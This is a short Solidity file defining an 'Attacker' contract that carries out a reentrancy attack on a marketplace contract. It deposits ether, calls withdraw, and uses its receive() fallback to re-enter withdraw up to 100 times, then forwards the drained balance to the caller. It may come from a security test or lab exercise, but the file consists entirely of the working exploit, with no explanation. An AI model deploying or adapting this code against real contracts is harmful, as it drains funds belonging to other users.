// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IMarketplace {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IMarketplace public marketplace;
    uint256 public callCount;
    uint256 public constant MAX_CALLS = 100;

    constructor(IMarketplace _marketplace) {
        marketplace = _marketplace;
    }

    receive() external payable {
        if (address(marketplace).balance >= 1 ether && callCount < MAX_CALLS) {
            callCount++;
            marketplace.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        marketplace.deposit{value: msg.value - 50000}();
        callCount = 0;
        marketplace.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}
